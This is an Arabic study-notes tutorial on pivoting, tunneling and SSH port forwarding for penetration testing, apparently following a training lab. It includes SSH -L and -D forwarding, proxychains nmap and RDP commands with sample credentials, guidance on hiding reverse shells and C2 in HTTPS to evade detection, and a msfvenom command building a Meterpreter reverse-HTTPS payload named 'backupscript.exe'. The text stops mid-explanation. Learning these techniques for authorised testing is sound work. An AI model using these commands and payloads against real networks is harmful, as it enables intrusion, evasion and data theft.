# Layer 1

![[PivotingandTunnelingVisualized.gif]]

لما بتشتغل **Red Teaming** أو **Penetration Testing** أو بتعمل **Active Directory Assessment**، غالبًا أول ما تخترق جهاز داخل الشركة مش هيكون هو الجهاز اللي فيه الـ Flag أو الـ Domain Controller أو الـ Database اللي أنت عايزها.

في شركات كتير بتقسم الشبكة لعدة أجزاء (Network Segments)، وده بيخلي فيه أجهزة **مش متاحة ليك مباشرة**.

يعني أنت وصلت لجهاز... لكن الجهاز اللي بعده مش شايفه.

هنا بيظهر مفهوم اسمه:

- Pivoting
    
- Tunneling
    
- Port Forwarding
    

دول من أهم المواضيع في الـ Internal Penetration Testing.

---

## خلينا نفهم المشكلة الأول

تخيل الشبكة بالشكل ده:

```text
          أنت (Attacker)
                |
          Internet
                |
        Web Server (تم اختراقه)
                |
     ------------------------
     |                      |
 DMZ Network          Internal Network
                            |
                      File Server
                            |
                     Domain Controller
```

أنت دلوقتي قدرت تخترق الـ Web Server.

لكن...

الـ Domain Controller أصلاً مش ظاهر ليك.

لو عملت:

```bash
ping DC
```

مش هيرد.

ولو عملت

```bash
nmap
```

مش هتلاقيه.

ليه؟

لأن الشبكة متقسمة.

---

## طيب لو أنا معايا Credentials؟

المقال بيقول:

> ربما تكون بالفعل حصلت على Credentials أو SSH Keys أو Hashes.

يعني مثلاً معاك:

- Username
    
- Password
    
- NTLM Hash
    
- SSH Key
    
- Access Token
    

لكن...

حتى لو معاك الباسورد...

أنت أصلاً **مش قادر توصل للجهاز**.

يعني المشكلة مش Authentication.

المشكلة Network.

---

## هنا بيجي دور Pivoting

بدل ما توصل من جهازك...

هتوصل من جهاز أنت اخترقته.

يعني:

بدل

```text
You ---------> Server
```

هيبقى

```text
You
 |
 |
 V

Compromised Machine
 |
 |
 V

Internal Server
```

الجهاز اللي اخترقته هيبقى "الكوبري" بتاعك.

---

## أول حاجة تعملها بعد اختراق أي جهاز

المقال بيقول:

أول حاجة تعملها هي إنك تعرف:

## 1. صلاحياتك

```text
هل أنا User؟

ولا Administrator؟

ولا SYSTEM؟
```

كل ما الصلاحيات تزيد...

كل ما فرص الـ Pivoting تزيد.

---

## 2. الشبكات المتوصلة بالجهاز

مثلاً

```bash
ipconfig
```

أو

```bash
ifconfig
```

ممكن تلاقي:

```text
Ethernet0

192.168.1.15
```

وكمان

```text
Ethernet1

10.10.20.5
```

الجهاز ده متوصل بشبكتين.

ودي فرصة ذهبية.

---

## 3. VPN

ممكن الجهاز فاتح VPN.

مثلاً موظف داخل على:

```text
Corporate VPN
```

يبقى الجهاز بقى شايف شبكة تانية خالص.

وأنت تقدر تستغل ده.

---

## لو الجهاز فيه أكتر من Network Adapter

المقال قال:

لو الجهاز فيه:

```text
NIC 1
```

على شبكة

```text
192.168.1.x
```

و

```text
NIC 2
```

على

```text
10.10.10.x
```

يبقى الجهاز شايف الشبكتين.

وأنت تقدر تستخدمه علشان تدخل الشبكة التانية.

وده هو Pivoting.

---

## يعني إيه Pivot؟

كلمة Pivot معناها:

> نقطة ارتكاز.

يعني الجهاز اللي اخترقته بقى نقطة انتقال.

---

## أسماء تانية للجهاز ده

المقال قال إن نفس الجهاز ممكن يتسمى:

## Pivot Host

يعني الجهاز اللي هتعمل منه Pivot.

---

## Proxy

لأنه هيبقى وسيط بينك وبين الأجهزة.

---

## Foothold

يعني أول موطئ قدم ليك داخل الشبكة.

---

## Beach Head

زي الجيش لما يحتل جزء صغير من الشاطئ الأول.

وبعدين يبدأ ينتشر.

---

## Jump Host

يعني جهاز تقف عليه وتنط منه للأجهزة التانية.

---

## ليه الشركات بتقسم الشبكة؟

اسمها

Network Segmentation

مثلاً

```text
HR
```

في شبكة.

---

```text
Finance
```

في شبكة.

---

```text
Developers
```

في شبكة.

---

```text
Servers
```

في شبكة.

---

علشان لو حد اخترق جهاز...

مايعرفش يوصل لكل حاجة بسهولة.

---

## Pivoting بيكسر التقسيم ده

يعني بدل ما أنت محبوس هنا:

```text
192.168.1.x
```

تستخدم جهاز داخل الشركة يوصل لك:

```text
10.10.10.x
```

---

## طيب إيه هو Tunneling؟

المقال قال:

Tunneling هو جزء من Pivoting.

مش حاجة مختلفة تمامًا.

---

## فكر فيه كده

أنت معاك مفتاح.

وعايز تبعته لصاحبك.

لكن خايف حد يفتش الطرد.

بدل ما تحط المفتاح كده...

تحطه جوه:

🐻 دبدوب.

الناس كلها هتشوف:

> لعبة أطفال.

لكن الحقيقة...

فيه مفتاح مستخبي.

---

وده بالضبط اللي بيعمله الـ Tunneling.

---

بدل ما تبعت بياناتك بشكلها الحقيقي.

بتغلفها داخل بروتوكول تاني.

مثلاً

```text
SSH
```

يتبعت داخل

```text
HTTP
```

أو

```text
HTTPS
```

---

فيبقى أي Firewall شايف:

```text
Web Traffic
```

لكن الحقيقة:

```text
Reverse Shell
```

أو

```text
C2 Traffic
```

---

## مثال

بدل

```text
Attacker
      |
Reverse Shell
      |
Victim
```

يبقى

```text
Attacker
      |
HTTPS
      |
Victim
```

الـ IDS يفتكرها:

```text
User Browsing Google
```

---

## أشهر مثال

VPN.

كل الداتا بتاعتك بتتحط داخل Tunnel.

---

## المقال قال

> VPNs are another form of tunneling.

وده صح.

---

## طيب إيه هو Port Forwarding؟

رغم إن المقال لسه مدخلش فيه...

لكن بما إنه في العنوان.

نفهمه.

---

تخيل عندك جهاز داخلي فاتح:

```text
RDP

3389
```

وأنت مش شايفه.

تعمل:

```text
Forward

3389

إلى

Localhost:13389
```

فيبقى عندك:

```text
localhost:13389
```

يفتح فعليًا:

```text
Internal Server:3389
```

وده اسمه

Port Forwarding.

---

## دلوقتي المقال دخل في مقارنة مهمة

ناس كتير بتتلخبط بين:

- Lateral Movement
    
- Pivoting
    
- Tunneling
    

---

## أولًا: Lateral Movement

يعني تتحرك بين الأجهزة.

مثلاً

```text
PC1
```

اخترقته.

لقيت عليه Password.

جربته على:

```text
PC2
```

اشتغل.

---

بعدها

```text
PC3
```

اشتغل.

---

بعدها

```text
File Server
```

اشتغل.

---

أنت كده بتتحرك أفقيًا داخل الشبكة.

---

هدفه:

زيادة السيطرة.

والوصول لحسابات أقوى.

---

## مثال المقال

أنت اخترقت جهاز.

لقيت:

```text
Administrator
```

بتاع الجهاز.

عملت Scan.

لقيت:

٣ أجهزة.

جربت نفس الباسورد.

اشتغل على جهاز تاني.

فدخلته.

وده اسمه:

Lateral Movement.

---

## ثانيًا: Pivoting

هنا مش مجرد بتتنقل.

أنت بتعدي حدود الشبكة.

يعني:

```text
Network A
```

إلى

```text
Network B
```

وده الفرق الأساسي.

---

المقال ذكر مثال جميل جدًا.

شركة عاملة فصل بين:

Enterprise Network

و

Operational Network

يعني مثلاً:

```text
موظفين
```

في شبكة.

---

```text
معدات المصنع
```

في شبكة تانية.

---

لقينا جهاز مهندس.

الجهاز ده متوصل بالشبكتين.

فاستغليناه.

ودخلنا الشبكة اللي مكنّاش نقدر نوصلها.

وده Pivoting.

---

## ثالثًا: Tunneling

هنا الهدف:

إخفاء الترافيك.

---

بدل ما تبعت

```text
Reverse Shell
```

تبعته داخل

```text
HTTPS
```

---

بدل ما تبعت أوامر

تبقى جوه:

```text
GET

POST
```

---

أي حد يبص على الشبكة يقول:

```text
ده بيفتح موقع.
```

لكن الحقيقة:

```text
ده بيتحكم في الجهاز.
```

---

## Command and Control (C2)

المقال ذكر

C2

وده اختصار:

Command and Control.

يعني السيرفر بتاع المهاجم.

هو اللي بيبعت أوامر.

ويستقبل النتائج.

---

## Exfiltration

المقال ذكر

Exfiltration.

وده معناه:

تهريب البيانات خارج الشركة.

مثلاً:

```text
Passwords

Documents

Database
```

كلها تتبعت داخل Tunnel.

---

## الفرق النهائي بينهم

| المفهوم              | الهدف                                                                                                          |
| -------------------- | -------------------------------------------------------------------------------------------------------------- |
| **Lateral Movement** | التنقل بين الأجهزة داخل نفس البيئة باستخدام صلاحيات أو بيانات اعتماد للوصول إلى موارد إضافية أو رفع الصلاحيات. |
| **Pivoting**         | استخدام جهاز مخترق كنقطة عبور للوصول إلى شبكات أو بيئات لم تكن متاحة لك مباشرة.                                |
| **Tunneling**        | تغليف (Encapsulate) الترافيك داخل بروتوكول آخر لإخفائه أو تمريره عبر الشبكة دون لفت الانتباه.                  |
| **Port Forwarding**  | إعادة توجيه الاتصال من بورت على جهاز إلى بورت على جهاز آخر، وغالبًا يُستخدم كأحد أساليب تنفيذ الـ Pivoting.    |

---

## الخلاصة

بعد ما تخلص قراءة الجزء ده، لازم تكون فاهم إن:

- **Pivoting** = استخدام جهاز مخترق كنقطة عبور للوصول لشبكات أو أجهزة معزولة.
    
- **Lateral Movement** = التنقل بين الأجهزة داخل الشبكة لتوسيع السيطرة أو الوصول إلى صلاحيات أعلى.
    
- **Tunneling** = إخفاء أو تغليف الترافيك داخل بروتوكول آخر (مثل HTTPS أو SSH) لتقليل فرص اكتشافه.
    
- **Port Forwarding** = فتح "ممر" بين بورت محلي وبورت على جهاز داخلي، بحيث تقدر تتعامل مع خدمة داخلية كأنها موجودة على جهازك.
    

> **العلاقة بينهم:** في اختبار اختراق داخلي أو Red Team Engagement، غالبًا هتعمل **Lateral Movement** بين الأجهزة، وتستخدم **Pivoting** للوصول لشبكات جديدة، وقد تعتمد على **Tunneling** و**Port Forwarding** لتنفيذ الحركة دي بشكل عملي وتجاوز قيود الشبكة.


------------------
# Layer 2
## The Networking Behind Pivoting

### فهم أساسيات الشبكات اللي بتخليك تعرف تعمل Pivoting

قبل ما تقدر تعمل **Pivoting** صح أثناء الـ Penetration Test أو Red Team Engagement، لازم تكون فاهم شوية أساسيات Networking. لأن أغلب مشاكل الـ Pivoting مش بتكون في الأدوات... بتكون في إنك مش فاهم الشبكة شغالة إزاي.

## يعني إيه IP Address؟

الـ IP Address هو عنوان الجهاز على الشبكة.

زي ما كل بيت ليه عنوان...

كل جهاز على الشبكة لازم يبقى ليه IP.

مثلاً:

```text
192.168.1.10
```

أو

```text
10.0.0.15
```

لو الجهاز معندوش IP...

يبقى بالنسبة للشبكة هو "مش موجود".

> بدون IP الجهاز مش هيعرف يبعت ولا يستقبل أي بيانات.

---

## الجهاز بياخد الـ IP إزاي؟

في طريقتين:

## 1- DHCP (Automatic)

وده الأشهر.

أول ما الجهاز يشتغل...

يروح يقول للـ DHCP Server:

> "اديني IP"

فالـ DHCP يرد عليه مثلاً:

```text
192.168.1.15
```

وده اللي بيحصل في أغلب أجهزة الموظفين.

---

## 2- Static IP

هنا الـ IP بيتكتب يدوي.

وده بيتعمل للأجهزة المهمة.

زي:

- Servers
    
- Routers
    
- Printers
    
- Switches
    
- أي جهاز بيقدم خدمة مهمة للشبكة
    

---

## يعني إيه NIC؟

NIC اختصار:

> **Network Interface Controller**

وده كارت الشبكة.

هو الجزء اللي الجهاز بيتوصل بيه بالشبكة.

ممكن يكون:

- Ethernet
    
- WiFi
    
- Virtual Adapter
    
- VPN Adapter
    

---

## هل الجهاز ممكن يبقى فيه أكتر من NIC؟

أيوه.

ودي من أهم الحاجات في الـ Pivoting.

مثلاً:

```text
Laptop

NIC1 → WiFi
192.168.1.50

NIC2 → VPN
10.10.10.5
```

الجهاز ده شايف شبكتين مختلفتين.

وده معناه إنه ممكن يبقى **Pivot Host**.

---

## ليه أول حاجة بنعملها ifconfig أو ipconfig؟

علشان نعرف:

- كام Interface موجود؟
    
- كل واحد واخد IP كام؟
    
- هل فيه VPN؟
    
- هل فيه شبكة داخلية مش كنا نعرف عنها؟
    

علشان كده أول أوامر تقريبًا بعد الاختراق هي:

في Linux:

```bash
ifconfig
```

أو

```bash
ip addr
```

وفي Windows:

```cmd
ipconfig
```

---

## تعال نشرح Output الـ ifconfig

المقال جاب Output بالشكل ده:

```text
eth0
134.122.100.200
```

## يعني إيه eth0؟

ده أول كارت شبكة.

غالبًا متوصل بالإنترنت.

---

بعده:

```text
eth1
10.106.0.172
```

وده كارت شبكة تاني.

غالبًا متوصل بشبكة داخلية.

---

بعده:

```text
lo
127.0.0.1
```

وده اسمه:

Loopback Interface.

---

## يعني إيه Loopback؟

الجهاز بيكلم نفسه.

يعني:

```bash
ping 127.0.0.1
```

مش بيطلع بره الجهاز أصلاً.

---

بعدها:

```text
tun0
```

وده مهم جدًا.

---

## يعني إيه tun0؟

كلمة

```
tun
```

جاية من

```
Tunnel
```

وده Interface بيتعمل لما يكون فيه VPN.

يعني بمجرد ما تعمل اتصال VPN...

هتلاقي Interface جديد اسمه:

```text
tun0
```

وده معناه إن الجهاز بقى داخل شبكة تانية.

وده اللي بيحصل في HTB وVPNات عمومًا.

---

## Public IP vs Private IP

المقال لفت النظر لحاجة مهمة.

## Public IP

زي:

```text
134.122.100.200
```

ده IP ينفع أي حد على الإنترنت يوصل له.

---

## Private IP

زي:

```text
10.106.0.172
```

أو

```text
192.168.x.x
```

أو

```text
172.16.x.x
```

دي IPات داخلية.

مينفعش حد من الإنترنت يوصلها مباشرة.

---

## طيب الناس بتطلع الإنترنت إزاي؟

هنا بيظهر:

## NAT

اختصار:

> Network Address Translation

الفكرة ببساطة:

بدل ما كل جهاز ياخد Public IP...

الراوتر بياخد Public IP واحد.

وبعدين يترجم الأجهزة الداخلية ليه.

يعني:

```text
PC1
192.168.1.10

↓

Router

↓

41.33.x.x

↓

Internet
```

وده السبب إنك من بره متقدرش توصل لـ:

```text
192.168.1.10
```

لأنه Private.

---

## شرح ipconfig

في Windows هنستخدم:

```cmd
ipconfig
```

هتلاقي مثلاً:

```text
Ethernet0

IPv4
10.129.221.36
```

وكمان:

```text
IPv6
```

---

## يعني إيه IPv6؟

هو الجيل الجديد من الـ IP.

بدل:

```text
192.168.1.1
```

يبقى:

```text
2001:db8::1
```

لكن أغلب الشركات لسه معتمدة على IPv4، وده اللي هنركز عليه في الـ Pivoting.

---

## Subnet Mask

المقال قال:

لو الـ IP زي رقم التليفون...

فالـ Subnet Mask زي مفتاح المحافظة.

مثلاً:

```text
IP

192.168.1.20
```

مع

```text
255.255.255.0
```

يبقى الشبكة هي:

```text
192.168.1.0/24
```

وأي جهاز يبدأ بـ:

```text
192.168.1
```

يبقى غالبًا في نفس الشبكة.

---

## Default Gateway

لو الجهاز عايز يكلم جهاز بره شبكته...

يبعت البيانات لمين؟

للـ Gateway.

غالبًا بيكون الراوتر.

مثلاً:

```text
PC

↓

Gateway

↓

Internet
```

في الـ Pivoting مهم تعرف الـ Gateway لأنه بيوضحلك الجهاز بيطلع على أنهي شبكات.

---

## Routing

دي من أهم النقاط في الفصل كله.

---

## يعني إيه Router؟

كل الناس فاكرة إن الـ Router هو الجهاز اللي في البيت.

لكن الحقيقة...

أي جهاز يقدر يبقى Router لو بيحول الترافيك بين شبكتين.

---

## Routing Table

كل جهاز عنده جدول اسمه:

```
Routing Table
```

وده عبارة عن خريطة.

بيقول:

> لو رايح للشبكة دي... امشي من هنا.

---

مثلاً:

```text
Destination

10.129.0.0

Gateway

10.10.14.1
```

يعني:

أي Packet رايحة لـ:

```text
10.129.x.x
```

ابعتها للـ Gateway ده.

---

بتشوف الجدول ده في Linux بالأوامر:

```bash
netstat -r
```

أو

```bash
ip route
```

---

## ليه الـ Routing Table مهم في الـ Pivoting؟

لأنك بتعرف:

الجهاز اللي اخترقته يقدر يوصل لفين.

مثلاً:

```text
Attacker

↓

Victim
```

لو الـ Routing Table بتاع الـ Victim فيه Route للشبكة:

```text
172.16.20.0
```

يبقى تقدر تعمل Pivot ليها.

---

## Default Route

لو الجهاز مش لاقي Route مناسب...

هيبعت كل حاجة للـ:

```
Default Gateway
```

وده اسمه:

```
Gateway of Last Resort
```

يعني آخر اختيار.

---

## Protocols و Services و Ports

المقال انتقل بعد كده للـ Ports.

---

## يعني إيه Protocol؟

هو القواعد اللي الأجهزة بتتواصل بيها.

زي:

- HTTP
    
- HTTPS
    
- FTP
    
- SSH
    
- SMB
    

---

## يعني إيه Port؟

تخيل الجهاز عبارة عن عمارة.

الـ IP هو عنوان العمارة.

لكن كل شقة لها رقم.

رقم الشقة ده هو:

Port.

مثلاً:

```text
80 → HTTP

443 → HTTPS

22 → SSH

3389 → RDP

445 → SMB
```

---

## ليه الـ Ports مهمة في الـ Pivoting؟

لأن ممكن الـ Firewall يسمح بـ:

```text
443
```

لكن يمنع:

```text
4444
```

فبدل ما تبعت Reverse Shell على:

```text
4444
```

تبعته على:

```text
443
```

فيعدي بسهولة.

وده سبب إن اختيار البورت مهم جدًا أثناء الاختبار.

---

## نصيحة الكاتب

الكاتب بيقول:

ارسم الشبكة دايمًا.

يعني كل ما تلاقي:

- جهاز
    
- IP
    
- Gateway
    
- Network
    
- VPN
    
- Route
    

ارسمهم في Diagram.

لأن كل ما الشبكة تكبر...

هتبدأ تتوه.

وأفضل أداة يقترحها هي **Draw.io** لرسم الـ Network Topology وتوثيق كل اللي اكتشفته أثناء الاختبار.

---

# Layer 3

## أولاً: يعني إيه Port Forwarding؟

خلينا نفتكر إحنا وصلنا لفين.
![[Pasted image 20260703175639.png]]

افترض إن عندنا الشبكة دي:

```text
           Kali (Attacker)
                 |
          10.10.15.5
                 |
          SSH (22)
                 |
        Ubuntu Server
       10.129.202.64
       172.16.5.129
                 |
      ---------------------
      |                   |
   Windows            Database
   172.16.5.19
```

إنت قدرت تخترق الـ Ubuntu Server.

لكن فيه شبكة داخلية:

```text
172.16.5.0/23
```

مش شايفها من جهازك.

فلازم تستخدم الـ Ubuntu Server كـ **Pivot Host**.

---

## إيه هو Port Forwarding؟

الـ Port Forwarding معناه:

> "خلي أي اتصال ييجي على بورت معين عندي، يتحول لبورت تاني على جهاز تاني."

مثال:

بدل ما برنامجك يتصل بـ:

```text
172.16.5.129:3306
```

هيتصل بـ:

```text
localhost:1234
```

والـ SSH هو اللي هيحول الاتصال للجهاز الداخلي.

يعني:

```text
Kali

localhost:1234
      │
      ▼
SSH Tunnel
      │
      ▼
Ubuntu
localhost:3306
```

بالنسبة للبرنامج اللي عندك، هو شايف إنه بيتصل بـ `localhost`، لكن في الحقيقة البيانات بتروح عبر الـ SSH للجهاز المخترق.

---

## السيناريو في المقال

الجهاز اللي اخترقناه هو:

```text
10.129.202.64
```

عملنا عليه Scan:

```bash
nmap -sT -p22,3306 10.129.202.64
```

وطلع:

```text
22 open
3306 closed
```

---

## ليه MySQL باين إنه Closed؟

لأن خدمة MySQL مش مفتوحة على الشبكة.

هي شغالة على:

```text
localhost:3306
```

يعني أي جهاز خارجي ميقدرش يوصلها.

لكن الجهاز نفسه يقدر.

وده شائع جدًا في قواعد البيانات لحمايتها من الوصول المباشر.

---

## الحل: SSH Local Port Forwarding

الأمر:

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

وده من أهم أوامر الـ SSH.

خلينا نفككه.

---

## الجزء الأول

```bash
-L
```

معناه:

> اعمل Local Port Forwarding.

---

## الجزء الثاني

```text
1234
```

ده البورت اللي هيفتح عندك على جهاز الـ Kali.

---

## الجزء الثالث

```text
localhost
```

مش الـ Kali.

دي تعني **localhost بالنسبة للـ Ubuntu Server** بعد ما الـ SSH يوصل له.

---

## الجزء الرابع

```text
3306
```

البورت اللي عليه MySQL.

---

يعني الجملة كلها معناها:

> "أي حاجة تيجي عندي على `localhost:1234`، ابعتها داخل الـ SSH للجهاز Ubuntu، وهناك وصلها إلى `localhost:3306`."

---

## بعد تنفيذ الأمر

هيفتح Session SSH عادية.

لكن في الخلفية هيعمل Listener.

لو كتبت:

```bash
netstat -antp
```

هتلاقي:

```text
127.0.0.1:1234 LISTEN
```

يعني جهازك بقى فاتح البورت 1234 ومستني أي اتصال.

---

## نتأكد باستخدام Nmap

عملوا:

```bash
nmap -sV -p1234 localhost
```

والنتيجة:

```text
1234 open mysql
```

---

استنى!

إزاي MySQL بقى موجود على جهازك؟

هو **مش موجود فعليًا**.

اللي حصل إن:

```text
Nmap

↓

localhost:1234

↓

SSH Tunnel

↓

Ubuntu

↓

localhost:3306

↓

MySQL
```

فالـ Nmap افتكر إن MySQL شغال عندك، لكنه في الحقيقة بيتعامل مع الخدمة البعيدة من خلال الـ Tunnel.

---

## هل أقدر أعمل أكتر من Forward؟

أكيد.

مثلاً:

```bash
ssh \
-L 1234:localhost:3306 \
-L 8080:localhost:80 \
ubuntu@10.129.202.64
```

يبقى:

```text
localhost:1234
        │
        ▼
MySQL

localhost:8080
        │
        ▼
Apache
```

يعني فتحت خدمتين مختلفتين في نفس الوقت.

---

## بعد كده المقال بدأ يتكلم عن Pivot الحقيقي

لما عملوا:

```bash
ifconfig
```

لقوا:

```text
ens192

10.129.202.64
```

ودي الشبكة اللي إحنا داخلين منها.

---

وفيه كمان:

```text
ens224

172.16.5.129
```

ودي شبكة داخلية تانية.

يبقى الجهاز بقى متوصل بشبكتين.

وده بالظبط اللي بندور عليه في الـ Pivoting.

---

## المشكلة الجديدة

إنت دلوقتي عارف إن فيه شبكة:

```text
172.16.5.0/23
```

لكن مش عارف فيها إيه.

هل فيها:

- Domain Controller؟
    
- File Server؟
    
- Workstations؟
    

لازم تعمل Scan.

---

## ليه مينفعش أعمل Nmap عادي؟

لو كتبت:

```bash
nmap 172.16.5.19
```

من جهازك.

هيحصل:

```text
No Route To Host
```

لأن جهازك أصلاً مش شايف الشبكة دي.

---

## الحل؟

نعمل **Dynamic Port Forwarding**.

---

## الفرق بين Local و Dynamic Port Forwarding

## Local Port Forwarding

أنت عارف الخدمة.

مثلاً:

```text
MySQL
```

فبتحولها.

يعني:

```text
1234

↓

3306
```

---

## Dynamic Port Forwarding

إنت **مش عارف الخدمات أصلاً**.

عايز تبعت أي Traffic للشبكة الداخلية.

وده بيتم باستخدام SOCKS Proxy.

---

## يعني إيه SOCKS؟

SOCKS اختصار:

> **Socket Secure**

وده بروتوكول بيشتغل كوسيط (Proxy).

بدل ما البرنامج يكلم الهدف مباشرة.

يكلم الـ SOCKS Server.

والـ SOCKS هو اللي يكمل الاتصال.

تخيلها كده:

```text
Nmap

↓

SOCKS

↓

SSH

↓

Ubuntu

↓

Internal Network
```

وده بيساعدك تتجاوز قيود الـ Firewall أو الـ NAT لأن كل الترافيك بيخرج من الـ Pivot Host.

---

## إنشاء SOCKS Tunnel

الأمر:

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

---

## معنى `-D`

يعني:

> Dynamic Port Forwarding.

---

## معنى 9050

هيبقى عندك:

```text
127.0.0.1:9050
```

وده هيكون SOCKS Proxy.

أي برنامج يبعث عليه...

الـ SSH هيوديه للشبكة الداخلية.

---

## طيب البرامج هتعرف تستخدمه إزاي؟

هنا ييجي دور:

```text
ProxyChains
```

---

## يعني إيه ProxyChains؟

برنامج بيجبر أي برنامج تاني يمرر كل اتصالاته عبر Proxy.

يعني بدل:

```text
Nmap

↓

Target
```

يبقى:

```text
Nmap

↓

ProxyChains

↓

SOCKS

↓

SSH

↓

Ubuntu

↓

Target
```

---

## إعداد ProxyChains

بنعدل الملف:

```text
/etc/proxychains.conf
```

وفي آخره نضيف:

```text
socks4 127.0.0.1 9050
```

يعني:

> استخدم الـ SOCKS اللي شغال على البورت 9050.

---

## أول Scan

بعد كده:

```bash
proxychains nmap -v -sn 172.16.5.1-200
```

لاحظ:

إحنا ما استخدمناش `nmap` لوحده.

استخدمنا:

```text
ProxyChains

↓

Nmap
```

فكل الـ Packets راحت للـ SOCKS الأول.

وبعدين الـ SSH.

وبعدين الشبكة الداخلية.

---

## ليه بنستخدم `-sT` مع ProxyChains؟

المقال نبه على نقطة مهمة جدًا.

مع ProxyChains لازم تستخدم:

```bash
-sT
```

اللي هي **TCP Connect Scan**.

ومتستخدمش:

```bash
-sS
```

اللي هي SYN Scan.

### السبب؟

لأن الـ SOCKS Proxy بيتعامل مع **اتصالات TCP كاملة**، لكنه **مش بيفهم أو يمرر الـ Raw أو Partial Packets** اللي بيعتمد عليها الـ SYN Scan.

علشان كده لو استخدمت `-sS`، هتاخد نتائج غير صحيحة أو الـ Scan يفشل.

---

## عمل Scan على جهاز Windows

بعد ما عرفوا إن الجهاز موجود:

```bash
proxychains nmap -Pn -sT 172.16.5.19
```

ولقوا بورتات مهمة:

```text
135
139
445
3389
```

ودي بورتات ويندوز المعتادة، ومن بينها RDP على 3389.

---

## هل الـ Metasploit يشتغل؟

أيوه.

بدل:

```bash
msfconsole
```

نشغله كده:

```bash
proxychains msfconsole
```

وساعتها كل الـ Modules هتستخدم نفس الـ SOCKS Tunnel تلقائيًا.

---

## وأخيرًا RDP

بدل ما تتصل مباشرة:

```bash
xfreerdp /v:172.16.5.19
```

تعمل:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

المسار الحقيقي للاتصال هيكون:

```text
xfreerdp
      │
      ▼
ProxyChains
      │
      ▼
SOCKS (9050)
      │
      ▼
SSH Tunnel
      │
      ▼
Ubuntu Pivot Host
      │
      ▼
172.16.5.19:3389
```

وبكده تقدر تفتح Remote Desktop على جهاز داخلي رغم إنه غير قابل للوصول مباشرة من جهازك.

---

## الخلاصة

في الجزء ده اتعرفنا على نوعين مهمين من الـ SSH Tunneling:

- **SSH Local Port Forwarding (`-L`)**: بنستخدمه لما نكون عارفين الخدمة اللي عايزين نوصلها (زي MySQL)، فنحولها لبورت محلي على جهازنا.
    
- **SSH Dynamic Port Forwarding (`-D`)**: بنستخدمه لما نحتاج نوصل لشبكة داخلية كاملة ونمرر أي برنامج (مثل Nmap أو Metasploit أو xfreerdp) من خلال **SOCKS Proxy**.
    
- **ProxyChains** هو اللي بيجبر البرامج إنها تستخدم الـ SOCKS Proxy بدل الاتصال المباشر.
    
- أثناء استخدام ProxyChains مع Nmap، لازم تعتمد على **TCP Connect Scan (`-sT`)** لأن الـ SOCKS Proxy لا يدعم الـ SYN Scan (`-sS`).
    
- بعد إعداد الـ Tunnel، أي أداة تقريبًا تقدر تتعامل مع الأجهزة الداخلية كأنها موجودة على نفس شبكتك، وده هو أساس تنفيذ الـ Pivoting في بيئات الاختبار الواقعية.

# Layer 4
---

## قبل ما نبدأ...

إحنا لحد دلوقتي اتعلمنا نوعين من الـ SSH Port Forwarding.

## 1. Local Port Forwarding (-L)

وده كان شكله:

```text
Kali
   │
localhost:1234
   │
SSH
   │
Ubuntu
localhost:3306
```

يعني:

أنا من جهازي وصلت لخدمة موجودة على الجهاز البعيد.

---

## 2. Dynamic Port Forwarding (-D)

وده كان:

```text
Kali

↓

SOCKS Proxy

↓

SSH

↓

Ubuntu

↓

Internal Network
```

وده خلاني أوصل لأي جهاز في الشبكة الداخلية.

---

## طيب... فيه مشكلة جديدة

خلينا نرجع للسيناريو.

```text
                  Kali
            10.10.15.5
                  │
                  │ SSH
                  │
      --------------------------
      │ Ubuntu Pivot Host      │
      │10.129.15.50            │
      │172.16.5.129            │
      --------------------------
                  │
                  │
                  │
      --------------------------
      │ Windows A              │
      │172.16.5.19             │
      --------------------------
```
![[Pasted image 20260704171657.png]]

إحنا دلوقتي نقدر نعمل:

- RDP
    
- SMB
    
- Nmap
    

على Windows.

تمام.

---

## السؤال اللي المقال سأله

> ماذا يحدث لو عايزين Reverse Shell؟

ودي أهم نقطة في الفصل كله.

---

## ليه الـ Reverse Shell مش هيشتغل؟

تعالى نفكر.

إنت عامل Listener عندك:

```text
Kali

10.10.15.5

Port 8000
```

وعملت Payload:

```text
Windows

↓

Connect to

10.10.15.5:8000
```

هل هيعرف يوصل؟

الإجابة:

❌ لا.

---

## ليه؟

لأن Windows أصلاً ميعرفش الطريق.

بص على الشبكة.

```text
Windows

172.16.5.19
```

شايف:

```text
172.16.5.x
```

بس.

لكن

```text
10.10.15.x
```

مش موجودة عنده.

يعني لما يحاول يعمل:

```text
connect(10.10.15.5)
```

هيقول:

> الطريق ده أنا معرفوش.

فالـ Packet هتترمي.

وده السبب إن الـ Reverse Shell يفشل. الفكرة الأساسية هنا إن جهاز Windows لا يملك Route للوصول إلى شبكة جهاز المهاجم، لذلك الاتصال العكسي المباشر مستحيل.

---

## طب نعمل إيه؟

لازم نخلي الـ Windows يكلم جهاز هو أصلاً شايفه.

مين؟

Ubuntu.

لأنه موجود معاه في نفس الشبكة.

```text
Windows

↓

172.16.5.129

Ubuntu
```

وده يقدر يوصل للـ Kali.

---

## الفكرة كلها

بدل ما الـ Reverse Shell يروح:

```text
Windows

↓

Kali
```

هيبقى:

```text
Windows

↓

Ubuntu

↓

SSH Tunnel

↓

Kali
```

وده اسمه

## Reverse Port Forwarding

---

## ليه بنستخدم Meterpreter؟
**Meterpreter** 
هو واحد من أقوى الـ **payloads** الموجودة في Metasploit Framework، وبيستخدمه مختبرو الاختراق (Penetration Testers) بعد ما ينجحوا في استغلال ثغرة على جهاز الهدف.

ببساطة:

> **الـ Exploit بيدخلك الجهاز، والـ Meterpreter بيديك تحكم كامل فيه.**


المقال بيقول:

RDP لوحده مش كفاية.

ليه؟

لأن ساعات:

- Clipboard مقفول
    
- مش عارف تنقل ملفات
    
- مش عارف تستخدم أدوات Metasploit
    
- مش عارف تعمل Post Exploitation
    
- مش عارف تستدعي Windows API
    

علشان كده بنحتاج Meterpreter Session.

وده بيديك تحكم أكبر بكتير من مجرد RDP.

---

## إنشاء الـ Payload

المقال استخدم:

```bash
msfvenom \
-p windows/x64/meterpreter/reverse_https \
LHOST=172.16.5.129 \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

خلينا نشرحه.

---

## -p

نوع الـ Payload.

```text
windows/x64/meterpreter/reverse_https
```

يعني:

Reverse HTTPS Meterpreter.

---

## LHOST

ودي أهم نقطة.

كتير بيغلط فيها.

المفروض تبقى:

```text
172.16.5.129
```

مش

```text
10.10.15.5
```

ليه؟

لأن Windows يقدر يوصل لـ Ubuntu.

لكن ميقدرش يوصل لـ Kali.

---

## LPORT

البورت اللي الـ Windows هيتصل بيه.

هنا:

```text
8080
```

---

## -o

